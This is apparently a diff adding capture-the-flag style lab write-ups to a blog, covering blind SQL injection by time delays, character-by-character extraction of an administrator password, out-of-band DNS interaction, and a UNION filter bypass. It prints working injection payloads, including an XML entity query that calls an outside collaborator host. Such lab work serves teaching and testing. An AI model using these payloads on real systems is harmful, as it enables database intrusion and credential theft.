@@ -1086,6 +1086,221 @@ Now, lets go ahead and login as the administrator user
 
 Nice, we have successfully solved this lab
 
+--------------------------
+
+# Blind SQL injection with time delays
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/69723393-4fdc-42f0-b4bc-8485f4cda63b)
+
+Navigate to the webpage and click on "View details"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73707d68-58aa-40bb-8b01-64b078cad938)
+
+Capturing the request and sending it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f09aa96-f85e-45d8-be1d-181b05236393)
+
+To trigger a 10 seconds delay, we can use the query
+```
+'|| pg_sleep(10)--
+```
+Ensure the query is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e708a78-6798-48cb-b97e-13f3305b9887)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1d0e3f32-a9da-49c8-8254-b7d5dc9a0f2b)
+
+Cool, we have successfully completed the task for this lab
+
+-------------------
+
+# Blind SQL injection with time delays and information retrieval
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6645cebd-6934-4453-b308-3cf4ce3fa2d3)
+
+Navigate to the webpage and click on "View details"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c35d3d3-5220-4d2b-82c4-c9358c1ab89d)
+
+Captutring this request and sending it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/faf3126c-369d-46fc-953d-93b3c52295f9)
+
+Lets start by triggering a 10s delay
+```
+'|| pg_sleep(10)--
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0fb5e6d2-79d8-4d0b-9341-44877c6f051b)
+
+Alright, cool we were able to trigger a 10 seconds delay
+
+We know the table name to be ```users```, the column names are ```username``` and ```password```, then the name of the user is ```administrator```
+
+But lets try to confirm if there really is a username ```administrator```, we can use the query
+```
+';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+Ensure the query is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6625acec-7d8b-4179-b35c-11701302d474)
+
+Now that we've confirmed that the username is present in the database. Lets check the length of the password. We can use the query
+```
+';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/723afd8b-e12f-4719-8b85-424acbd899fc)
+
+This confirmed that the password is greater than 1
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73a2fd2d-f571-47c9-a745-6593a4874f71)
+
+This screenshot confirmed that the length of the passowrd to be 20
+
+Now that we know the length of the password lets start extracting the characters one by one. We'll be inviting burp intruder to the party. We can use the query
+```
+';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+Lets assume the password characters to be lowercase alphanumeric characters.
+
+using the query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20ecdea7-5e59-45a9-957b-0626d6897aa5)
+
+We didn't get the 10s delay which means ```m``` isn't the first character of the password.
+
+Trying the other characters,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7b8ab0b1-1e9f-4c64-ba9f-a81385118c87)
+
+I got the first character of the password to be ```7```
+
+To get the second character, we can use the query
+```
+';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0ff61d3-bbee-4282-851a-f656ea76bd9a)
+
+I got the second character of the password to be ```v```
+
+To get the third character of the password, you can use the query
+```
+';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,3,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e586247d-1e05-4475-a4c3-a8dfb5239f97)
+
+I got the third character of the password to be ```3```.
+
+This process can be continued until we get to the 20th password character
+
+To get the 20th character, you can use the query
+```
+';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,20,1)='h') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c156b5a6-778f-4afc-9a5f-6488dc9ddf6f)
+
+I got the last password to be ```h```.
+
+I got the full password to be ```7v3zmmujptl7r634bjlh```. Now, lets go ahead and log in as the administrator user
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/72466b83-df39-4980-9a70-ca03b0c9bec4)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b7fbcf4-4264-4770-919f-51532aab34ad)
+
+cool stuff, we have successfully solved this lab
+
+----------------------
+
+# Blind SQL injection with out-of-band interaction
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e8644200-5108-4986-bb0d-5ebd2736260b)
+
+Navigate to the webpage and click on "View details"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/152a078f-a338-4a71-88f1-c9a5a6cd3517)
+
+Capturing the request on burpsuite and sending it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fb8fd3f-418a-4a30-b9c6-b3f8bcd55b62)
+
+To trigger out-of-band interaction with burp collaborator, we can use the query
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+To get the payload from burp collaborator client
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4554ade9-c4a0-4794-a789-fd0aad82fab7)
+
+Now, lets paste this query using the payload we got from burp collaborator client
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8cllzq3qnv0bxuz5k1o5wgeokfq6ev.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+Ensure the query is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/08c0d005-f261-468c-a8bb-8ccba81224c9)
+
+Cool, we were ale to achieve dns lookup. 
+
+Going back to our browser
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dcf28cd-c117-4f06-bb0f-952369a09f8d)
+
+We have successfully solved this lab.
+
+-----------------------------
+
+#  Blind SQL injection with out-of-band data exfiltration
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6fcf547f-1c14-47f4-a477-62d205b37541)
+
+Navigate to the webpage and click on "View details"
+
+
+----------------------------
+
+# SQL injection with filter bypass via XML encoding
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/06dcb941-e80a-4fe1-b119-d00db360ef23)
+
+Navigate  to the webpage
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/02b4b2fd-a8e2-42a4-8bd6-fc1b51cf4389)
+
+click on stock and capture the request on burpsuite
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62db20ee-af3f-4712-b5ba-d93daf4e8fa0)
+
+So, we have a table ```users``` and columns ```username``` and ```password```
+
+So, to solve this we can use the query
+```
+UNION SELECT username || '~' || password FROM users
+```
+
+
+
+
+
+
+
+
 
 
 
